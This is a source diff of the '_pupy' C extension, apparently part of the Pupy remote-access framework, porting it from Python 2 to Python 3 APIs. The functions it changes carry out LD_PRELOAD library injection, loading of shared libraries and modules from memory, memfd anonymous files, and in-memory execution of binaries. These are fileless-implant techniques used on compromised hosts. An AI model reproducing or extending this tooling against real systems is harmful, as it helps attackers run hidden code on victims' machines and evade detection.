@@ -5,6 +5,14 @@
 
 #define _GNU_SOURCE
 
+#ifdef _PUPY_SO
+#   define PY_SSIZE_T_CLEAN
+#	include <Python.h>
+#else
+#	include "Python-dynload.h"
+#	include "Python-dynload-os.h"
+#endif
+
 #include <stdlib.h>
 #include <stdint.h>
 #include <stdio.h>
@@ -13,7 +21,6 @@
 #include <dlfcn.h>
 #include <limits.h>
 #include "debug.h"
-#include "Python-dynload.h"
 #include "daemonize.h"
 #include <arpa/inet.h>
 #include "tmplibrary.h"
@@ -171,10 +178,10 @@ static PyObject *Py_ld_preload_inject_dll(PyObject *self, PyObject *args)
     if (pid == -1) {
         dprint("Couldn\'t daemonize: %m\n");
         unlink(ldobject);
-        return PyInt_FromLong(-1);
+        return PyLong_FromLong(-1);
     }
 
-    return PyInt_FromLong(pid);
+    return PyLong_FromLong(pid);
 }
 
 #ifdef Linux
@@ -275,7 +282,7 @@ static PyObject *Py_memfd_create(PyObject *self, PyObject *args, PyObject *kwarg
         return PyErr_SetFromErrno(PyExc_OSError);
     }
 
-    py_file = PyFile_FromFile(c_file, memfd_path, "w+b", fclose);
+    py_file = PyFile_FromFd(c_file, memfd_path, "w+b", -1, "", "\n", "", fclose);
     if (!py_file) {
         close(fd);
         return NULL;
@@ -291,71 +298,113 @@ static PyObject *Py_memfd_create(PyObject *self, PyObject *args, PyObject *kwarg
 
 static PyObject *Py_load_dll(PyObject *self, PyObject *args)
 {
-    const char *lpDllBuffer;
-    uint32_t dwDllLenght;
+    char *lpDllBuffer;
+    Py_ssize_t dwDllLenght;
     const char *dllname;
-    if (!PyArg_ParseTuple(args, "ss#", &dllname, &lpDllBuffer, &dwDllLenght))
+    PyObject *dataobj;
+    if (!PyArg_ParseTuple(args, "sS", &dllname, &dataobj))
         return NULL;
 
-    dprint("Py_load_dll(%s)\n", dllname);
+    if (PyBytes_AsStringAndSize(dataobj, &lpDllBuffer, &dwDllLenght)==-1) {
+            PyErr_Format(PyExc_ImportError,
+                 "Py_load_dll : cannot convert bytes to char * : %s ", dllname);
+            return NULL;
+    }
 
-    return PyLong_FromVoidPtr(memdlopen(dllname, lpDllBuffer, dwDllLenght, RTLD_LOCAL | RTLD_NOW));
+    dprint("Py_load_dll(%s, buf=%p BufSize=%d)\n", dllname, lpDllBuffer, dwDllLenght);
+
+    void * hmem = memdlopen(dllname, lpDllBuffer, dwDllLenght, RTLD_LOCAL | RTLD_NOW);
+    if (!hmem) {
+        dprint("Py_load_dll(): Couldn't load %s\n", dllname);
+        PyErr_Format(ExecError, "Py_load_dll(): Couldn't load %s\n", dllname);
+        return NULL;
+    }
+    dprint("Py_load_dll(): returning handle: %x\n",hmem);
+    return PyLong_FromVoidPtr(hmem);
 }
 
-bool
-import_module(const char *initfuncname, char *modname, const char *data, size_t size) {
+
+static PyObject *
+Py_import_module(PyObject *self, PyObject *args) {
+    char *data;
+    Py_ssize_t size;
+    char *initfuncname;
+    char *modname;
+    char *pathname;
     char *oldcontext;
+
+    PyObject *dataobj;
+    PyObject *spec;
+    /* code, initfuncname, fqmodulename, path */
+    if (!PyArg_ParseTuple(args, "SsssO:import_module",
+          &dataobj,
+          &initfuncname, &modname, &pathname, &spec)) {
+        dprint("error in PyArg_ParseTuple()\n");
+        return NULL;
+    }
+
+    dprint("DEBUG! %s@%s\n", initfuncname, modname);
+
+    if (PyBytes_AsStringAndSize(dataobj, &data, &size)==-1) {
+            PyErr_Format(PyExc_ImportError,
+                 "cannot convert bytes to char * : %s ", pathname);
+            return NULL;
+    }
 
     dprint("import_module: init=%s mod=%s (%p:%lu)\n",
            initfuncname, modname, data, size);
 
     void *hmem = memdlopen(modname, data, size, RTLD_LOCAL | RTLD_NOW);
     if (!hmem) {
-        dprint("Couldn't load %s: %m\n", modname);
-        return false;
+        dprint("Py_import_module(): Couldn't load %s\n", modname);
+        PyErr_Format(PyExc_ImportError, "Py_load_dll(): Couldn't load %s\n", modname);
+        return NULL;
     }
 
-    void (*do_init)() = dlsym(hmem, initfuncname);
+    PyObject *(*do_init)(void);
+    do_init= dlsym(hmem, initfuncname);
     if (!do_init) {
         dprint("Couldn't find sym %s in %s: %m\n", initfuncname, modname);
         dlclose(hmem);
-        return false;
+        return NULL;
     }
 
     oldcontext = _Py_PackageContext;
     _Py_PackageContext = modname;
     dprint("Call %s@%s (%p)\n", initfuncname, modname, do_init);
-    do_init();
+    PyObject *m = do_init();
     _Py_PackageContext = oldcontext;
 
     dprint("Call %s@%s (%p) - complete\n", initfuncname, modname, do_init);
 
-    return true;
-}
+    // multi phase init
+    if (PyObject_TypeCheck(m, &PyModuleDef_Type)) {
+        struct PyModuleDef *def;
+        PyObject *state;
 
-static PyObject *
-Py_import_module(PyObject *self, PyObject *args) {
-    char *data;
-    int size;
-    char *initfuncname;
-    char *modname;
-    char *pathname;
+        m = PyModule_FromDefAndSpec((PyModuleDef*)m, spec);
+        def = PyModule_GetDef(m);
+        state = PyModule_GetState(m);
+        if (state == NULL) {
+            PyModule_ExecDef(m, def);
+        }
+        dprint("return from PyObject_TypeCheck\n", modname);
+        return m;
+    }
+    PyObject *modules = NULL;
+    modules = PyImport_GetModuleDict();
+    PyObject *name = PyUnicode_FromString(modname);
+    _PyImport_FixupExtensionObject(m, name, name, modules);
 
-    /* code, initfuncname, fqmodulename, path */
-    if (!PyArg_ParseTuple(args, "s#sss:import_module",
-                  &data, &size,
-                  &initfuncname, &modname, &pathname)) {
-        return NULL;
+    Py_DECREF(name);
+
+    if (PyErr_Occurred()) {
+        dprint("error at the end\n");
+            return NULL;
     }
 
-    dprint("DEBUG! %s@%s\n", initfuncname, modname);
 
-    if (!import_module(initfuncname, modname, data, size)) {
-        PyErr_Format(PyExc_ImportError,
-                 "Could not find function %s", initfuncname);
-        return NULL;
-    }
-
+    dprint("calling PyImport_ImportModule(%s)\n", modname);
     /* Retrieve from sys.modules */
     return PyImport_ImportModule(modname);
 }
@@ -368,6 +417,7 @@ static PyObject *Py_mexec(PyObject *self, PyObject *args)
     PyObject *redirected_obj = NULL;
     PyObject *detach_obj = NULL;
 
+//TODO: change all deprecated and broken s# notation in PyArg_ParseTuple
     if (!PyArg_ParseTuple(args, "s#OOO", &buffer, &buffer_size, &argv_obj, &redirected_obj, &detach_obj))
         return NULL;
 
@@ -407,13 +457,13 @@ static PyObject *Py_mexec(PyObject *self, PyObject *args)
     PyObject * p_stderr = Py_None;
 
     if (redirected) {
-        p_stdin = PyFile_FromFile(fdopen(stdior[0], "w"), "mexec:stdin", "a", fclose);
-        p_stdout = PyFile_FromFile(fdopen(stdior[1], "r"), "mexec:stdout", "r", fclose);
-        p_stderr = PyFile_FromFile(fdopen(stdior[2], "r"), "mexec:stderr", "r", fclose);
+        p_stdin = PyFile_FromFd(fdopen(stdior[0], "w"), "mexec:stdin", "a", 0, "", "\n", "", fclose);
+        p_stdout = PyFile_FromFd(fdopen(stdior[1], "r"), "mexec:stdout", "r", 0, "", "\n", "", fclose);
+        p_stderr = PyFile_FromFd(fdopen(stdior[2], "r"), "mexec:stderr", "r", 0, "", "\n", "", fclose);
 
-        PyFile_SetBufSize(p_stdin, 0);
-        PyFile_SetBufSize(p_stdout, 0);
-        PyFile_SetBufSize(p_stderr, 0);
+        //PyFile_SetBufSize(p_stdin, 0);
+        //PyFile_SetBufSize(p_stdout, 0);
+        //PyFile_SetBufSize(p_stderr, 0);
     }
 
     return Py_BuildValue("i(OOO)", pid, p_stdin, p_stdout, p_stderr);
@@ -448,12 +498,36 @@ static PyMethodDef methods[] = {
     { NULL, NULL },     /* Sentinel */
 };
 
-DL_EXPORT(void)
-init_pupy(void) {
+static struct PyModuleDef PupyModuleDef =
+{
+//    PyModuleDef_HEAD_INIT,
+    {
+        { 0, 0, 1, NULL} ,           
+        NULL, /* m_init */          
+        0,    /* m_index */         
+        NULL
+    }, /* m_copy */          
+    "_pupy", /* name of module */
+    "", /* module documentation, may be NULL */
+    -1,   /* size of per-interpreter state of the module, or -1 if the module keeps state in global variables. */
+    methods
+};
 
-    PyObject *pupy = Py_InitModule3("_pupy", methods, (char *) module_doc);
+#ifdef _PUPY_DYNLOAD
+#define FUNC_EXPORT PyMODINIT_FUNC
+#else
+#define FUNC_EXPORT void *
+#endif
+
+FUNC_EXPORT PyInit__pupy(void) {
+
+    PyObject *pupy;
+    //PyObject *pupy = Py_InitModule3("_pupy", methods, (char *) module_doc);
+    dprint("creating pupy module ...\n");
+    pupy = PyModule_Create(&PupyModuleDef);
+
     if (!pupy) {
-        return;
+        return NULL;
     }
 
     PyModule_AddStringConstant(pupy, "revision", GIT_REVISION_HEAD);
@@ -462,7 +536,7 @@ init_pupy(void) {
     PyModule_AddObject(pupy, "error", ExecError);
 
 #ifdef _PUPY_SO
-    setup_jvm_class();
+    //setup_jvm_class();
 #endif
 
 #ifdef _FEATURE_PATHMAP
@@ -473,4 +547,5 @@ init_pupy(void) {
     set_pathmap_callback(__pathmap_callback);
 #endif
 #endif
+    return pupy;
 }
